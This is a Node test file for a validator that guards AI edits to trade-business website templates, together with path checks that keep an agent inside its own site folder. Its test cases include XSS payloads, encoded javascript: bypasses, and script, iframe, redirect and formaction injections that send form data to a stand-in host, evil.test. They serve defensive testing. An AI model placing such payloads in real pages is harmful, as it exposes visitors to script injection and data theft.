// node --test agent/: the rules that keep AI edits safe to publish.
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, rmSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { checkHtml, checkPaths, contrast, htmlFiles } from "./validate.mjs";

const formAction = "https://portal.test/api/forms/joe";
const good = readFileSync(new URL("../templates/trades/index.html", import.meta.url), "utf8")
  .replace(/\{\{FORM_ACTION\}\}/g, formAction)
  .replace(/\{\{[A-Z0-9_]+\}\}/g, "x");
const goodPost = readFileSync(new URL("../templates/trades/blog/post.html", import.meta.url), "utf8").replace(/\{\{[A-Z0-9_]+\}\}/g, "x");

test("a filled-in template passes", () => assert.deepEqual(checkHtml(good, { formAction }), []));

test("a filled-in blog post passes", () => assert.deepEqual(checkHtml(goodPost, { formAction }), []));

test("an injected script in a nested blog page fails", () => {
  const bad = goodPost.replace("</body>", '<script src="https://evil.test/x.js"></script></body>');
  assert.ok(checkHtml(bad, { formAction }).length > 0);
});

test("the html walk finds nested pages, recursively", () => {
  const dir = mkdtempSync(join(tmpdir(), "fss-"));
  mkdirSync(join(dir, "blog", "furnace-tips"), { recursive: true });
  writeFileSync(join(dir, "index.html"), "home");
  writeFileSync(join(dir, "blog", "index.html"), "list");
  writeFileSync(join(dir, "blog", "furnace-tips", "index.html"), "post");
  writeFileSync(join(dir, "robots.txt"), "not html");
  assert.deepEqual(new Set(htmlFiles(dir)), new Set(["index.html", "blog/index.html", "blog/furnace-tips/index.html"]));
  assert.deepEqual(htmlFiles(join(dir, "missing")), []);
  rmSync(dir, { recursive: true, force: true });
});

test("injected script, handlers, iframes, and redirects fail", () => {
  const bad = (s) => checkHtml(good.replace("</body>", `${s}</body>`), { formAction }).length > 0;
  assert.ok(bad('<script src="https://evil.test/x.js"></script>'));
  assert.ok(bad("<script>fetch('https://evil.test')</script>"));
  assert.ok(bad('<img src=x onerror="alert(1)">'));
  assert.ok(bad('<a href="javascript:alert(1)">x</a>'));
  assert.ok(bad('<iframe src="https://evil.test"></iframe>'));
  assert.ok(bad('<meta http-equiv="refresh" content="0;url=https://evil.test">'));
  assert.ok(!bad('<iframe src="https://www.google.com/maps/embed?pb=1"></iframe>'));
});

test("the form, footer, placeholders, and em dashes are protected", () => {
  assert.ok(checkHtml(good.replace(formAction, "https://evil.test/collect"), { formAction }).some((p) => p.includes("form posts")));
  assert.ok(checkHtml(good.replace("Site by", "Made by"), { formAction }).some((p) => p.includes("footer")));
  assert.ok(checkHtml(good.replace("<h1", "<h1>{{HEADLINE}}</h1><h1"), { formAction }).some((p) => p.includes("PLACEHOLDERS")));
  assert.ok(checkHtml(good.replace("</h1>", " \u2014 now</h1>"), { formAction }).some((p) => p.includes("em dash")));
});

test("the form-status script can't be edited, even though it's allowed", () => {
  const edited = good.replace('document.getElementById("yr")', 'fetch("https://evil.test");document.getElementById("yr")');
  assert.ok(checkHtml(edited, { formAction }).some((p) => p.includes("form-status")));
});

test("the brand color keeps white text readable", () => {
  assert.equal(contrast("#ffffff", "#000000").toFixed(0), "21");
  const livery = (c) => checkHtml(good.replace("--livery:#14532d", `--livery:${c}`), { formAction });
  assert.deepEqual(livery("#7a1f1f"), []);
  assert.ok(livery("#b45309").some((p) => p.includes("too light"))); // burnt orange: 5.0:1
  assert.ok(livery("rgb(20,83,45)").some((p) => p.includes("6-digit hex")));
});

test("only the request's own site folder may change", () => {
  assert.deepEqual(checkPaths(["sites/joe/index.html", "sites/joe/img/t1-1.jpg"], "joe"), []);
  assert.equal(checkPaths(["sites/other/index.html", "AGENTS.md", ".github/workflows/agent.yml"], "joe").length, 3);
});

test("browser-decoded URL and attribute bypasses are rejected", () => {
  for (const injection of [
    '<a href="jav&#x61;script:alert(1)">x</a>', '<a href="java&#9;script:alert(1)">x</a>',
    '<iframe src=https://evil.test></iframe>', '<iframe src="https://www.google.com/maps/embed-evil"></iframe>',
    '<iframe src="https://www.google.com/maps/embed/../../search"></iframe>',
    '<iframe src="https://www.google.com/maps/embed" srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
    '<button form="quote" formaction=https://evil.test/collect>Send</button>',
    '<input type=submit form="quote" formaction=https://evil.test/collect>',
    '<link rel=stylesheet href=https://evil.test/a.css>',
    '<link rel=stylesheet href=https://fonts.googleapis.com.evil.test/css>',
    '<svg><a xlink:href="&#106;avascript:alert(1)">x</a></svg>',
    '<template><img src=x ONERROR=alert(1)></template>',
  ]) assert.ok(checkHtml(good.replace('</body>', `${injection}</body>`), { formAction }).length, injection);
});

test("ordinary links, decoded approved action, fonts and maps remain valid", () => {
 const html = good.replace(formAction, formAction.replace('joe', 'jo&#101;')).replace('</body>', '<a href="/blog/">Blog</a><a href="tel:+15555555555">Call</a><a href="https://booking.example.test">Book with provider</a><iframe src=https://www.google.com/maps/embed?pb=1></iframe><link rel=stylesheet href=https://fonts.googleapis.com/css2?family=Inter></body>');
 assert.deepEqual(checkHtml(html, {formAction}), []);
 assert.equal(checkPaths(['sites/joe/../other/index.html', 'sites/joe/../../agent/run.mjs'], 'joe').length, 2);
});

test("foreign frameset document is rejected", () => assert.ok(checkHtml('<html><head><title>Site</title></head><frameset><frame src=https://evil.test><noframes>Site by <a href="https://frontstepsites.com">Front Step Sites</a></noframes></frameset></html>', {formAction}).length));
